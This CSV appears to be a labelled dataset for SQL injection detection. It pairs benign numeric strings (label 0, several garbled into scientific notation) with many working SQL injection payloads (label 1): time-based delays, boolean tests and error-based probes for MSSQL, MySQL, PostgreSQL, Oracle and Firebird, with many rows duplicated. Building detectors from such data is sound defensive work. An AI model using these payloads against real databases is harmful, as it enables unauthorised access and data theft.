sentence,attack_type,len_payload
6442,0,4
7032,0,4
7039,0,4
7043,0,4
7059,0,4
7081,0,4
7092,0,4
7098,0,4
7106,0,4
7109,0,4
7118,0,4
7146,0,4
7150,0,4
9140,0,4
9141,0,4
9146,0,4
9159,0,4
9167,0,4
9170,0,4
9173,0,4
9182,0,4
13107,0,5
13189,0,5
13191,0,5
13194,0,5
13270,0,5
13300,0,5
13328,0,5
13420,0,5
13440,0,5
13590,0,5
13591,0,5
13593,0,5
13600,0,5
13630,0,5
13679,0,5
13710,0,5
13750,0,5
14100,0,5
14139,0,5
14140,0,5
24232,0,5
24248,0,5
24249,0,5
24324,0,5
24391,0,5
24410,0,5
24429,0,5
39313,0,5
39375,0,5
39392,0,5
39419,0,5
39426,0,5
50408,0,5
50420,0,5
50430,0,5
50490,0,5
50491,0,5
50513,0,5
6.79504E+13,0,11
7.67474E+13,0,11
8.51849E+13,0,11
9.56341E+13,0,11
1.06099E+14,0,11
1.06705E+14,0,11
1.13026E+14,0,11
1.20958E+14,0,11
1.31469E+14,0,11
1.31573E+14,0,11
1.42424E+14,0,11
1.42716E+14,0,11
1.56766E+14,0,11
1.83912E+14,0,11
1.84493E+14,0,11
1.97877E+14,0,11
2.03614E+14,0,11
2.07129E+14,0,11
6.58835E+15,0,11
6.59088E+15,0,11
9.99022E+15,0,11
9.99809E+15,0,11
9.99969E+15,0,11
3.1E+17,1,7
1.4E+36,0,7
',1,1
'',1,2
'-',1,3
-,1,1
 --,1,2
' ',1,3
' -- ,1,4
 -- &password = ,1,14
' -- &password = ,1,16
  ( select top 1,1,14
'  ( select top 1,1,17
'  )  )  ,1,7
  )  )    )  )    )  )   waitfor delay '0:0:20' --,1,48
  )  )    )  )    )  )   waitfor delay '0:0:20' --,1,51
'  )  )    )  )    )  )   waitfor delay '0:0:20' /* ,1,51
  )  )    )  )   )  waitfor delay '0:0:20' --,1,43
'  )  )    )  )   )  waitfor delay '0:0:20' --,1,46
'  )  )    )  )   )  waitfor delay '0:0:20' /* ,1,46
"  )  )    )  )   and 0 = benchmark ( 3000000,MD5 ( 1  )  )   --",1,61
"'  )  )    )  )   and 0 = benchmark ( 3000000,MD5 ( 1  )  )   --",1,64
"  )  )    )  )   and 0 = benchmark ( 3000000,MD5 ( 1  )  )   %23",1,62
"'  )  )    )  )   and 0 = benchmark ( 3000000,MD5 ( 1  )  )   %23",1,65
"  )  )    )  )   and 0 = benchmark ( 3000000,MD5 ( 1  )  )   /*",1,61
"'  )  )    )  )   and 0 = benchmark ( 3000000,MD5 ( 1  )  )   /*",1,64
  )  )    )  )   waitfor delay '0:0:20' --,1,40
'  )  )    )  )   waitfor delay '0:0:20' --,1,43
  )  )    )  )   waitfor delay '0:0:20' /* ,1,40
'  )  )    )  )   waitfor delay '0:0:20' /* ,1,43
"'  )  )   )  AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a )  AND   (  (   ( 'dhco' = 'dhco",1,299
"'  )  )   )  AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a )  AND   (  (   ( 'tZDZ' LIKE 'tZDZ",1,302
"'  )  )   )  AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a )  AND   (  (   ( 'dhco' = 'dhco",1,299
"'  )  )   )  AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a )  AND   (  (   ( 'tZDZ' LIKE 'tZDZ",1,302
"  )  )   )  AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a )  AND   (  (   ( 5532 = 5532",1,293
"  )  )   )  AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a )  AND   (  (   ( 5532 = 5532",1,293
"  )  )   )  and 0 = benchmark ( 3000000,MD5 ( 1  )  )   --",1,56
"'  )  )   )  and 0 = benchmark ( 3000000,MD5 ( 1  )  )   --",1,59
"  )  )   )  and 0 = benchmark ( 3000000,MD5 ( 1  )  )   %23",1,57
"'  )  )   )  and 0 = benchmark ( 3000000,MD5 ( 1  )  )   %23",1,60
"  )  )   )  and 0 = benchmark ( 3000000,MD5 ( 1  )  )   /*",1,56
"'  )  )   )  and 0 = benchmark ( 3000000,MD5 ( 1  )  )   /*",1,59
'  )  )   )  AND 1305 = 1248-- AND   (  (   ( 'ViWt' LIKE 'ViWt,1,63
'  )  )   )  AND 1917 IN   (  (  CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 1917 = 1917 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 'cKDx' = 'cKDx,1,294
'  )  )   )  AND 1917 IN   (  (  CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 1917 = 1917 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 'fclk' LIKE 'fclk,1,297
'  )  )   )  AND 1917 IN   (  (  CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 1917 = 1917 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 'cKDx' = 'cKDx,1,294
'  )  )   )  AND 1917 IN   (  (  CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 1917 = 1917 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 'fclk' LIKE 'fclk,1,297
  )  )   )  AND 1917 IN   (  (  CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 1917 = 1917 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 7819 = 7819,1,288
  )  )   )  AND 1917 IN   (  (  CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 1917 = 1917 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 7819 = 7819,1,288
  )  )   )  AND 2082 =  ( ':clz:'|| ( SELECT CASE 2082 WHEN 2082 THEN 1 ELSE 0 END FROM RDB$DATABASE ) ||':xid:' )  AND   (  (   ( 9223 = 9223,1,140
'  )  )   )  AND 2082 =  ( ':clz:'|| ( SELECT CASE 2082 WHEN 2082 THEN 1 ELSE 0 END FROM RDB$DATABASE ) ||':xid:' )  AND   (  (   ( 'veki' = 'veki,1,146
'  )  )   )  AND 2082 =  ( ':clz:'|| ( SELECT CASE 2082 WHEN 2082 THEN 1 ELSE 0 END FROM RDB$DATABASE ) ||':xid:' )  AND   (  (   ( 'VQRp' LIKE 'VQRp,1,149
'  )  )   )  AND 2273 = 4910# AND   (  (   ( 'AthN' LIKE 'AthN,1,62
'  )  )   )  AND 2474 = 1083# AND   (  (   ( 'ajQS' = 'ajQS,1,59
  )  )   )  AND 2691 = 2691# AND   (  (   ( 7036 = 7036,1,53
'  )  )   )  AND 2691 = 2691# AND   (  (   ( 'DExy' = 'DExy,1,59
'  )  )   )  AND 2691 = 2691# AND   (  (   ( 'rCSx' LIKE 'rCSx,1,62
  )  )   )  AND 3245 = 3156# AND   (  (   ( 7003 = 7003,1,53
'  )  )   )  AND 3399 = 2610-- AND   (  (   ( 'TXfr' = 'TXfr,1,60
'  )  )   )  AND 3587 = 1004-- AND   (  (   ( 'KFoW' = 'KFoW,1,60
"  )  )   )  AND 4081 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 112 ) ||CHR ( 119 ) ||CHR ( 84 ) ||CHR ( 72 ) ,5 )  AND   (  (   ( 6513 = 6513",1,133
"'  )  )   )  AND 4081 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 112 ) ||CHR ( 119 ) ||CHR ( 84 ) ||CHR ( 72 ) ,5 )  AND   (  (   ( 'XNLQ' LIKE 'XNLQ",1,142
"'  )  )   )  AND 4081 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 112 ) ||CHR ( 119 ) ||CHR ( 84 ) ||CHR ( 72 ) ,5 )  AND   (  (   ( 'xsAP' = 'xsAP",1,139
  )  )   )  AND 4301 =  ( SELECT 4301 FROM PG_SLEEP ( 5  )  )  -- AND   (  (   ( 9098,1,83
  )  )   )  AND 4301 =  ( SELECT 4301 FROM PG_SLEEP ( 5  )  )  -- AND   (  (   ( 9098 = 9098,1,90
'  )  )   )  AND 4301 =  ( SELECT 4301 FROM PG_SLEEP ( 5  )  )  -- AND   (  (   ( 'LdCk' = 'LdCk,1,96
'  )  )   )  AND 4301 =  ( SELECT 4301 FROM PG_SLEEP ( 5  )  )  -- AND   (  (   ( 'oSUM' LIKE 'oSUM,1,99
'  )  )   )  AND 4319 = 5374# AND   (  (   ( 'fYjS' LIKE 'fYjS,1,62
'  )  )   )  AND 4605 =  ( SELECT UPPER ( XMLType ( CHR ( 60 ) ||CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 4605 = 4605 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 ) ||CHR ( 62  )  )   )  FROM DUAL )  AND   (  (   ( 'vEwE' = 'vEwE,1,338
'  )  )   )  AND 4605 =  ( SELECT UPPER ( XMLType ( CHR ( 60 ) ||CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 4605 = 4605 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 ) ||CHR ( 62  )  )   )  FROM DUAL )  AND   (  (   ( 'qWFh' LIKE 'qWFh,1,341
'  )  )   )  AND 4605 =  ( SELECT UPPER ( XMLType ( CHR ( 60 ) ||CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 4605 = 4605 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 ) ||CHR ( 62  )  )   )  FROM DUAL )  AND   (  (   ( 'vEwE' = 'vEwE,1,338
'  )  )   )  AND 4605 =  ( SELECT UPPER ( XMLType ( CHR ( 60 ) ||CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 4605 = 4605 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 ) ||CHR ( 62  )  )   )  FROM DUAL )  AND   (  (   ( 'qWFh' LIKE 'qWFh,1,341
  )  )   )  AND 4605 =  ( SELECT UPPER ( XMLType ( CHR ( 60 ) ||CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 4605 = 4605 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 ) ||CHR ( 62  )  )   )  FROM DUAL )  AND   (  (   ( 2293 = 2293,1,332
  )  )   )  AND 4605 =  ( SELECT UPPER ( XMLType ( CHR ( 60 ) ||CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 4605 = 4605 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 ) ||CHR ( 62  )  )   )  FROM DUAL )  AND   (  (   ( 2293 = 2293,1,332
  )  )   )  AND 4694 = 2332# AND   (  (   ( 4760 = 4760,1,53
'  )  )   )  AND 6476 = 115 AND   (  (   ( 'tCfT' LIKE 'tCfT,1,60
  )  )   )  AND 6695 = 6695-- AND   (  (   ( 8636 = 8636,1,54
'  )  )   )  AND 6695 = 6695-- AND   (  (   ( 'hebG' LIKE 'hebG,1,63
'  )  )   )  AND 6695 = 6695-- AND   (  (   ( 'KPwq' = 'KPwq,1,60
'  )  )   )  AND 7025 = 7439 AND   (  (   ( 'wzOL' = 'wzOL,1,58
"'  )  )   )  AND 7194 = CTXSYS.DRITHSX.SN ( 7194, ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7194 = 7194 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   )  AND   (  (   ( 'rWOl' = 'rWOl",1,299
"'  )  )   )  AND 7194 = CTXSYS.DRITHSX.SN ( 7194, ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7194 = 7194 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   )  AND   (  (   ( 'MqjG' LIKE 'MqjG",1,302
"'  )  )   )  AND 7194 = CTXSYS.DRITHSX.SN ( 7194, ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7194 = 7194 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   )  AND   (  (   ( 'rWOl' = 'rWOl",1,299
"'  )  )   )  AND 7194 = CTXSYS.DRITHSX.SN ( 7194, ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7194 = 7194 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   )  AND   (  (   ( 'MqjG' LIKE 'MqjG",1,302
"  )  )   )  AND 7194 = CTXSYS.DRITHSX.SN ( 7194, ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7194 = 7194 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   )  AND   (  (   ( 6261 = 6261",1,293
"  )  )   )  AND 7194 = CTXSYS.DRITHSX.SN ( 7194, ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7194 = 7194 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   )  AND   (  (   ( 6261 = 6261",1,293
  )  )   )  AND 7371 = 4214 AND   (  (   ( 6219 = 6219,1,52
'  )  )   )  AND 7586 = 6671 AND   (  (   ( 'IJbl' LIKE 'IJbl,1,61
'  )  )   )  AND 7767 = CAST ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7767 = 7767 )  THEN 1 ELSE 0 END  )  )  ::text||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 )  AS NUMERIC )  AND   (  (   ( 'ayUw' = 'ayUw,1,282
'  )  )   )  AND 7767 = CAST ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7767 = 7767 )  THEN 1 ELSE 0 END  )  )  ::text||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 )  AS NUMERIC )  AND   (  (   ( 'VuGy' LIKE 'VuGy,1,285
'  )  )   )  AND 7767 = CAST ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7767 = 7767 )  THEN 1 ELSE 0 END  )  )  ::text||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 )  AS NUMERIC )  AND   (  (   ( 'ayUw' = 'ayUw,1,282
'  )  )   )  AND 7767 = CAST ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7767 = 7767 )  THEN 1 ELSE 0 END  )  )  ::text||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 )  AS NUMERIC )  AND   (  (   ( 'VuGy' LIKE 'VuGy,1,285
  )  )   )  AND 7767 = CAST ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7767 = 7767 )  THEN 1 ELSE 0 END  )  )  ::text||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 )  AS NUMERIC )  AND   (  (   ( 7274 = 7274,1,276
  )  )   )  AND 7767 = CAST ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7767 = 7767 )  THEN 1 ELSE 0 END  )  )  ::text||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 )  AS NUMERIC )  AND   (  (   ( 7274 = 7274,1,276
  )  )   )  AND 8025 = 4290-- AND   (  (   ( 6935 = 6935,1,54
"  )  )   )  AND 8214 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 98 ) ||CHR ( 105 ) ||CHR ( 106 ) ||CHR ( 71 ) ,5 ) -- AND   (  (   ( 5085 = 5085",1,135
"'  )  )   )  AND 8214 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 98 ) ||CHR ( 105 ) ||CHR ( 106 ) ||CHR ( 71 ) ,5 ) -- AND   (  (   ( 'fdYW' LIKE 'fdYW",1,144
"'  )  )   )  AND 8214 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 98 ) ||CHR ( 105 ) ||CHR ( 106 ) ||CHR ( 71 ) ,5 ) -- AND   (  (   ( 'YaZY' = 'YaZY",1,141
'  )  )   )  AND 9119 = 8874-- AND   (  (   ( 'yqjx' LIKE 'yqjx,1,63
  )  )   )  AND 9217 = UTL_INADDR.0_HOST_ADDRESS ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 9217 = 9217 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   AND   (  (   ( 'KGZB' = 'KGZB,1,298
  )  )   )  AND 9217 = UTL_INADDR.0_HOST_ADDRESS ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 9217 = 9217 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   AND   (  (   ( 'AeRN' LIKE 'AeRN,1,301
  )  )   )  AND 9217 = UTL_INADDR.0_HOST_ADDRESS ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 9217 = 9217 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   AND   (  (   ( 'KGZB' = 'KGZB,1,298
  )  )   )  AND 9217 = UTL_INADDR.0_HOST_ADDRESS ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 9217 = 9217 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   AND   (  (   ( 'AeRN' LIKE 'AeRN,1,301
  )  )   )  AND 9217 = UTL_INADDR.0_HOST_ADDRESS ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 9217 = 9217 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   AND   (  (   ( 90 = 90,1,288
  )  )   )  AND 9217 = UTL_INADDR.0_HOST_ADDRESS ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 9217 = 9217 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   AND   (  (   ( 90 = 90,1,288
  )  )   )  AND 9263 =  ( SELECT 9263 FROM PG_SLEEP ( 5  )  )   AND   (  (   ( 745 = 745,1,86
'  )  )   )  AND 9263 =  ( SELECT 9263 FROM PG_SLEEP ( 5  )  )   AND   (  (   ( 'NMeg' LIKE 'NMeg,1,97
